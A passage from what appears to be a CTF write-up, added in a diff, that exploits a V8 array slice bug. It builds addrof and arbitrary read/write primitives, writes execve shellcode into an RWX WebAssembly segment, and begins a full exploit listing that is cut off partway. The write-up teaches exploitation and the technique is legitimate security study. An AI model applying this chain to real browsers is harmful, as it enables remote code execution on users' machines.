+need an ‘absolute’ address (not a compressed pointer in the v8 heap).
+One such address we might be interested in writing to is a segment of
+web assembly.</p>
+<p><br></p>
+<h3 id="wasm-modules">–[ - WASM modules</h3>
+<p>Another fun feature is the use of web assembly modules in v8. These
+currently create rwx memory segments, which make them a prime exploit
+target, although who knows for how much longer that will be the
+case.</p>
+<p>This is how we would create an executable wasm function in v8: The
+actual wasm code can be generated <a
+href="https://wasdk.github.io/WasmFiddle/">here.</a></p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_code <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>([<span class="dv">0</span><span class="op">,</span><span class="dv">97</span><span class="op">,</span><span class="dv">115</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">133</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">96</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">127</span><span class="op">,</span><span class="dv">3</span><span class="op">,</span><span class="dv">130</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">4</span><span class="op">,</span><span class="dv">132</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">112</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">5</span><span class="op">,</span><span class="dv">131</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">6</span><span class="op">,</span><span class="dv">129</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">7</span><span class="op">,</span><span class="dv">145</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">6</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">101</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">111</span><span class="op">,</span><span class="dv">114</span><span class="op">,</span><span class="dv">121</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">4</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">97</span><span class="op">,</span><span class="dv">105</span><span class="op">,</span><span class="dv">110</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">10</span><span class="op">,</span><span class="dv">138</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">132</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">65</span><span class="op">,</span><span class="dv">42</span><span class="op">,</span><span class="dv">11</span>])<span class="op">;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_mod <span class="op">=</span> <span class="kw">new</span> WebAssembly<span class="op">.</span><span class="fu">Module</span>(wasm_code)<span class="op">;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_instance <span class="op">=</span> <span class="kw">new</span> WebAssembly<span class="op">.</span><span class="fu">Instance</span>(wasm_mod)<span class="op">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_func <span class="op">=</span> wasm_instance<span class="op">.</span><span class="at">exports</span><span class="op">.</span><span class="at">main</span><span class="op">;</span></span></code></pre></div>
+<p>Afterwards, the code there can be executed with
+<code>wasm_func()</code></p>
+<p>Much like the typed array situation, the <code>wasm_instance</code>
+object will exist in the v8 heap (thus accessible with our arb r/w and
+addrof functions), and it will contain a pointer to the rwx wasm code
+segment (which is outside the v8 heap). With gdb, I found this offset to
+be 0x68.</p>
+<p><br></p>
+<h3 id="putting-it-all-together">–[ - Putting it all together</h3>
+<p>The challenge requires us to execute the
+<code>/chal/flagprinter</code> file on the remote system, which we can
+do through some simple shellcode if we can abuse those wasm modules.</p>
+<p>We already have all the primitives we need, so now it’s just a matter
+of putting it all together.</p>
+<p>First we can create the web assembly module described above, creating
+a rwx memory segment. We can use our <code>addrof</code> and
+<code>arb_r</code> functions to get the absolute address of this
+segment:</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co">// rwx ptr can be found at wasm_instance+0x68</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> addr_to_read <span class="op">=</span> <span class="fu">addrof</span>(wasm_instance) <span class="op">+</span> <span class="bn">0x68</span>n<span class="op">;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> rwx <span class="op">=</span> <span class="fu">arb_r</span>(addr_to_read)</span></code></pre></div>
+<p>Afterwards we can setup our arbitrary write to outside the v8 heap
+using a typed array, and overwrite its backing store pointer to our rwx
+segment.</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">ArrayBuffer</span>(<span class="bn">0x100</span>)</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> uint8_arr <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(buf)</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf_addr <span class="op">=</span> <span class="fu">addrof</span>(buf)</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="co">// offset to backing store ptr at 0x60</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> backing_addr <span class="op">=</span> buf_addr <span class="op">+</span> <span class="bn">0x60</span>n</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="co">// overwrite backing store ptr so all uint8_arr access happen in the rwx segment</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a><span class="fu">arb_w</span>(backing_addr<span class="op">,</span> rwx)</span></code></pre></div>
+<p>After that, its a simple matter of copying in our shellcode and
+running <code>wasm_func()</code>. I used <a
+href="https://defuse.ca/online-x86-assembler.htm#disassembly">this</a>
+to generate the shellcode array.</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">// execve /chal/flagprinter</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> shellcode <span class="op">=</span> [<span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xC7</span><span class="op">,</span> <span class="bn">0xC0</span><span class="op">,</span> <span class="bn">0x3B</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x31</span><span class="op">,</span> <span class="bn">0xF6</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x31</span><span class="op">,</span> <span class="bn">0xD2</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xC7</span><span class="op">,</span> <span class="bn">0xC1</span><span class="op">,</span> <span class="bn">0x72</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x00</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xB9</span><span class="op">,</span> <span class="bn">0x61</span><span class="op">,</span> <span class="bn">0x67</span><span class="op">,</span> <span class="bn">0x70</span><span class="op">,</span> <span class="bn">0x72</span><span class="op">,</span> <span class="bn">0x69</span><span class="op">,</span> <span class="bn">0x6E</span><span class="op">,</span> <span class="bn">0x74</span><span class="op">,</span> <span class="bn">0x65</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0xB9</span><span class="op">,</span> <span class="bn">0x2F</span><span class="op">,</span> <span class="bn">0x63</span><span class="op">,</span> <span class="bn">0x68</span><span class="op">,</span> <span class="bn">0x61</span><span class="op">,</span> <span class="bn">0x6C</span><span class="op">,</span> <span class="bn">0x2F</span><span class="op">,</span> <span class="bn">0x66</span><span class="op">,</span> <span class="bn">0x6C</span><span class="op">,</span> <span class="bn">0x51</span><span class="op">,</span> <span class="bn">0x48</span><span class="op">,</span> <span class="bn">0x89</span><span class="op">,</span> <span class="bn">0xE7</span><span class="op">,</span> <span class="bn">0x0F</span><span class="op">,</span> <span class="bn">0x05</span>]</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="co">// backing store now points to the rwx segment, copy in our shellcode</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> shellcode<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>    uint8_arr[i] <span class="op">=</span> shellcode[i]</span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="co">// run shellcode</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="fu">wasm_func</span>()<span class="op">;</span></span></code></pre></div>
+<figure>
+<img src="flag.jpg" alt="flag" />
+<figcaption aria-hidden="true">flag</figcaption>
+</figure>
+<p>Thanks faith!!!</p>
+<p>—-[ - Full exploit code</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Helper functions to convert between float and integer primitives</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="co">// taken from this writeup: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">ArrayBuffer</span>(<span class="dv">8</span>)<span class="op">;</span> <span class="co">// 8 byte array buffer</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> f64_buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">Float64Array</span>(buf)<span class="op">;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> u64_buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint32Array</span>(buf)<span class="op">;</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">ftoi</span>(val) { <span class="co">// typeof(val) == float</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>    f64_buf[<span class="dv">0</span>] <span class="op">=</span> val<span class="op">;</span></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">BigInt</span>(u64_buf[<span class="dv">0</span>]) <span class="op">+</span> (<span class="bu">BigInt</span>(u64_buf[<span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">32</span>n)<span class="op">;</span> <span class="co">// Watch for little endianness</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">itof</span>(val) { <span class="co">// typeof(val) == BigInt</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>    u64_buf[<span class="dv">0</span>] <span class="op">=</span> <span class="bu">Number</span>(val <span class="op">&amp;</span> <span class="bn">0xffffffff</span>n)<span class="op">;</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>    u64_buf[<span class="dv">1</span>] <span class="op">=</span> <span class="bu">Number</span>(val <span class="op">&gt;&gt;</span> <span class="dv">32</span>n)<span class="op">;</span></span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> f64_buf[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a><span class="co">// debugging function to display float values as hex</span></span>
+<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">toHex</span>(val) {</span>
+<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot;0x&quot;</span> <span class="op">+</span> <span class="fu">ftoi</span>(val)<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>)<span class="op">;</span></span>
+<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-23"><a href="#cb23-23" aria-hidden="true" tabindex="-1"></a><span class="co">// set up starter arrays to slice</span></span>
+<span id="cb23-24"><a href="#cb23-24" aria-hidden="true" tabindex="-1"></a>a <span class="op">=</span> [<span class="fl">1.1</span><span class="op">,</span> <span class="fl">2.2</span><span class="op">,</span> <span class="fl">3.3</span>]<span class="op">;</span></span>
+<span id="cb23-25"><a href="#cb23-25" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> [{<span class="dt">A</span><span class="op">:</span><span class="dv">1</span>}<span class="op">,</span> {<span class="dt">B</span><span class="op">:</span><span class="dv">2</span>}<span class="op">,</span> {<span class="dt">C</span><span class="op">:</span><span class="dv">3</span>}]<span class="op">;</span></span>
+<span id="cb23-26"><a href="#cb23-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-27"><a href="#cb23-27" aria-hidden="true" tabindex="-1"></a><span class="co">// trigger the bug- sizeof new arrays = old array length + 2</span></span>
+<span id="cb23-28"><a href="#cb23-28" aria-hidden="true" tabindex="-1"></a>float_arr <span class="op">=</span> a<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb23-29"><a href="#cb23-29" aria-hidden="true" tabindex="-1"></a>obj_arr <span class="op">=</span> b<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb23-30"><a href="#cb23-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-31"><a href="#cb23-31" aria-hidden="true" tabindex="-1"></a><span class="co">// this value exists 1 element past the end of the array, which is the start</span></span>
+<span id="cb23-32"><a href="#cb23-32" aria-hidden="true" tabindex="-1"></a><span class="co">// of the float JSArray (where its map is found)</span></span>
+<span id="cb23-33"><a href="#cb23-33" aria-hidden="true" tabindex="-1"></a>float_map <span class="op">=</span> float_arr[<span class="dv">3</span>]<span class="op">;</span></span>
+<span id="cb23-34"><a href="#cb23-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-35"><a href="#cb23-35" aria-hidden="true" tabindex="-1"></a><span class="co">// elements ptr for our float array is next to the map</span></span>
+<span id="cb23-36"><a href="#cb23-36" aria-hidden="true" tabindex="-1"></a>float_elems <span class="op">=</span> float_arr[<span class="dv">4</span>]<span class="op">;</span></span>
+<span id="cb23-37"><a href="#cb23-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-38"><a href="#cb23-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-39"><a href="#cb23-39" aria-hidden="true" tabindex="-1"></a><span class="co">// map differences: obj - float = 0x50</span></span>
+<span id="cb23-40"><a href="#cb23-40" aria-hidden="true" tabindex="-1"></a><span class="co">// elements ptr: obj - float = 0x30</span></span>
+<span id="cb23-41"><a href="#cb23-41" aria-hidden="true" tabindex="-1"></a><span class="co">// these values are true if allocated in the order above</span></span>
+<span id="cb23-42"><a href="#cb23-42" aria-hidden="true" tabindex="-1"></a>obj_map <span class="op">=</span> <span class="fu">itof</span>(<span class="fu">ftoi</span>(float_map) <span class="op">+</span> (<span class="bn">0x50</span>n))<span class="op">;</span></span>
+<span id="cb23-43"><a href="#cb23-43" aria-hidden="true" tabindex="-1"></a>obj_elems <span class="op">=</span> <span class="fu">itof</span>(<span class="fu">ftoi</span>(float_elems) <span class="op">+</span> (<span class="bn">0x30</span>n))<span class="op">;</span></span>
+<span id="cb23-44"><a href="#cb23-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-45"><a href="#cb23-45" aria-hidden="true" tabindex="-1"></a><span class="co">// helper functions to manipulate JSArray maps and elem pointers</span></span>
+<span id="cb23-46"><a href="#cb23-46" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">set_float_arr_map</span>(val) { <span class="co">//typeof(val) == float</span></span>
+<span id="cb23-47"><a href="#cb23-47" aria-hidden="true" tabindex="-1"></a>        float_arr[<span class="dv">3</span>] <span class="op">=</span> val<span class="op">;</span></span>
+<span id="cb23-48"><a href="#cb23-48" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-49"><a href="#cb23-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-50"><a href="#cb23-50" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">set_float_arr_elems</span>(val) { <span class="co">//typeof(val) == float</span></span>
+<span id="cb23-51"><a href="#cb23-51" aria-hidden="true" tabindex="-1"></a>        float_arr[<span class="dv">4</span>] <span class="op">=</span> val<span class="op">;</span></span>
+<span id="cb23-52"><a href="#cb23-52" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-53"><a href="#cb23-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-54"><a href="#cb23-54" aria-hidden="true" tabindex="-1"></a><span class="co">// point float elements to the obj elements</span></span>
+<span id="cb23-55"><a href="#cb23-55" aria-hidden="true" tabindex="-1"></a><span class="co">// float_arr and obj_arr now share an elements ptr, but treat</span></span>
+<span id="cb23-56"><a href="#cb23-56" aria-hidden="true" tabindex="-1"></a><span class="co">// the elements differently</span></span>
+<span id="cb23-57"><a href="#cb23-57" aria-hidden="true" tabindex="-1"></a><span class="fu">set_float_arr_elems</span>(obj_elems)</span>
+<span id="cb23-58"><a href="#cb23-58" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-59"><a href="#cb23-59" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">addrof</span>(in_obj) {</span>
+<span id="cb23-60"><a href="#cb23-60" aria-hidden="true" tabindex="-1"></a>        <span class="co">// put the obj into our object array</span></span>
+<span id="cb23-61"><a href="#cb23-61" aria-hidden="true" tabindex="-1"></a>        obj_arr[<span class="dv">0</span>] <span class="op">=</span> in_obj<span class="op">;</span></span>
+<span id="cb23-62"><a href="#cb23-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-63"><a href="#cb23-63" aria-hidden="true" tabindex="-1"></a>        <span class="co">// accessing the first element of the float array</span></span>
+<span id="cb23-64"><a href="#cb23-64" aria-hidden="true" tabindex="-1"></a>        <span class="co">// treats the value there as a float:</span></span>
+<span id="cb23-65"><a href="#cb23-65" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> addr <span class="op">=</span> float_arr[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb23-66"><a href="#cb23-66" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-67"><a href="#cb23-67" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Convert to bigint</span></span>
+<span id="cb23-68"><a href="#cb23-68" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="fu">ftoi</span>(addr)<span class="op">;</span></span>
+<span id="cb23-69"><a href="#cb23-69" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-70"><a href="#cb23-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-71"><a href="#cb23-71" aria-hidden="true" tabindex="-1"></a><span class="co">// &#39;arbitrary&#39; r/w functions using the .slice() vuln to change the</span></span>
+<span id="cb23-72"><a href="#cb23-72" aria-hidden="true" tabindex="-1"></a><span class="co">// elements ptr to the given address</span></span>
+<span id="cb23-73"><a href="#cb23-73" aria-hidden="true" tabindex="-1"></a><span class="co">// due to pointer compression in v8, we can only use this r/w in the v8 heap</span></span>
+<span id="cb23-74"><a href="#cb23-74" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">arb_r</span>(addr) { <span class="co">// typeof(addr) == BigInt</span></span>
+<span id="cb23-75"><a href="#cb23-75" aria-hidden="true" tabindex="-1"></a>    t <span class="op">=</span> [<span class="fl">1.1</span>]</span>
+<span id="cb23-76"><a href="#cb23-76" aria-hidden="true" tabindex="-1"></a>    <span class="co">// read is performed at addr + 0x8</span></span>
+<span id="cb23-77"><a href="#cb23-77" aria-hidden="true" tabindex="-1"></a>    addr <span class="op">=</span> addr <span class="op">-</span> <span class="bn">0x8</span>n</span>
+<span id="cb23-78"><a href="#cb23-78" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-79"><a href="#cb23-79" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ensure addr is tagged as a pointer</span></span>
+<span id="cb23-80"><a href="#cb23-80" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (addr <span class="op">%</span> <span class="dv">2</span>n <span class="op">==</span> <span class="dv">0</span>) {</span>
+<span id="cb23-81"><a href="#cb23-81" aria-hidden="true" tabindex="-1"></a>                addr <span class="op">+=</span> <span class="dv">1</span>n<span class="op">;</span></span>
+<span id="cb23-82"><a href="#cb23-82" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb23-83"><a href="#cb23-83" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-84"><a href="#cb23-84" aria-hidden="true" tabindex="-1"></a>    tmp_arr <span class="op">=</span> t<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)</span>
+<span id="cb23-85"><a href="#cb23-85" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set elem ptr to desired address</span></span>
+<span id="cb23-86"><a href="#cb23-86" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">2</span>] <span class="op">=</span> <span class="fu">itof</span>(addr)</span>
+<span id="cb23-87"><a href="#cb23-87" aria-hidden="true" tabindex="-1"></a>    <span class="co">// return value there as a BigInt</span></span>
+<span id="cb23-88"><a href="#cb23-88" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">ftoi</span>(tmp_arr[<span class="dv">0</span>])</span>
+<span id="cb23-89"><a href="#cb23-89" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-90"><a href="#cb23-90" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-91"><a href="#cb23-91" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">arb_w</span>(addr<span class="op">,</span> val) { <span class="co">// both as BigInts</span></span>
+<span id="cb23-92"><a href="#cb23-92" aria-hidden="true" tabindex="-1"></a>    t <span class="op">=</span> [<span class="fl">1.1</span>]</span>
+<span id="cb23-93"><a href="#cb23-93" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-94"><a href="#cb23-94" aria-hidden="true" tabindex="-1"></a>    <span class="co">// write is made at addr + 0x8</span></span>
+<span id="cb23-95"><a href="#cb23-95" aria-hidden="true" tabindex="-1"></a>    addr <span class="op">=</span> addr <span class="op">-</span> <span class="bn">0x8</span>n</span>
+<span id="cb23-96"><a href="#cb23-96" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-97"><a href="#cb23-97" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ensure addr is tagged</span></span>
+<span id="cb23-98"><a href="#cb23-98" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (addr <span class="op">%</span> <span class="dv">2</span>n <span class="op">==</span> <span class="dv">0</span>) {</span>
+<span id="cb23-99"><a href="#cb23-99" aria-hidden="true" tabindex="-1"></a>                addr <span class="op">+=</span> <span class="dv">1</span>n<span class="op">;</span></span>
+<span id="cb23-100"><a href="#cb23-100" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb23-101"><a href="#cb23-101" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-102"><a href="#cb23-102" aria-hidden="true" tabindex="-1"></a>    tmp_arr <span class="op">=</span> t<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)</span>
+<span id="cb23-103"><a href="#cb23-103" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set elem ptr to desired address</span></span>
+<span id="cb23-104"><a href="#cb23-104" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">2</span>] <span class="op">=</span> <span class="fu">itof</span>(addr)</span>
+<span id="cb23-105"><a href="#cb23-105" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-106"><a href="#cb23-106" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set addr to desired value</span></span>
+<span id="cb23-107"><a href="#cb23-107" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">0</span>] <span class="op">=</span> <span class="fu">itof</span>(val)</span>
+<span id="cb23-108"><a href="#cb23-108" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb23-109"><a href="#cb23-109" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-110"><a href="#cb23-110" aria-hidden="true" tabindex="-1"></a><span class="co">// setup rwx wasm module</span></span>
+<span id="cb23-111"><a href="#cb23-111" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> wasm_code <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>([<span class="dv">0</span><span class="op">,</span><span class="dv">97</span><span class="op">,</span><span class="dv">115</span><span class="op">,</span><span class="dv">109</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">133</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">96</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">127</span><span class="op">,</span><span class="dv">3</span><span class="op">,</span><span class="dv">130</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">128</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">1</span><span class="op">,</span><span class="dv">0</span><span 